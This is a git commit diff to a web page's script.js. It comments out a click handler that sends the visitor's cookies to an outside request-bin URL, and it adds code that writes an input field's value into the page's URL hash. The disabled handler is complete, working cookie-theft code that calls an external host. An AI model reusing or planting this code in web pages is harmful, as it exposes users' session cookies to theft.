1c587163c7f7519ae54c631f942deec3b323c535
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-24 17:47:25 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,18 @@
-document.addEventListener('click', function() {
-    var cookies = document.cookie;
-    fetch('https://enh87g4rhccr5.x.pipedream.net/capture-cookies?cookie=' + encodeURIComponent(cookies))
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-            return response.text();
-        })
-        .then(data => console.log('Cookies envoyés avec succès :', data))
-        .catch(error => console.error('Erreur lors de l\'envoi des cookies :', error));
-});
+// document.addEventListener('click', function() {
+//     var cookies = document.cookie;
+//     fetch('https://enh87g4rhccr5.x.pipedream.net/capture-cookies?cookie=' + encodeURIComponent(cookies))
+//         .then(response => {
+//             if (!response.ok) {
+//                 throw new Error('Network response was not ok');
+//             }
+//             return response.text();
+//         })
+//         .then(data => console.log('Cookies envoyés avec succès :', data))
+//         .catch(error => console.error('Erreur lors de l\'envoi des cookies :', error));
+// });
+const word = document.getElementById("word");
+const res = document.getElementById("result");
+
+word.oninput = () => {
+   document.location.hash = word.value;
+}
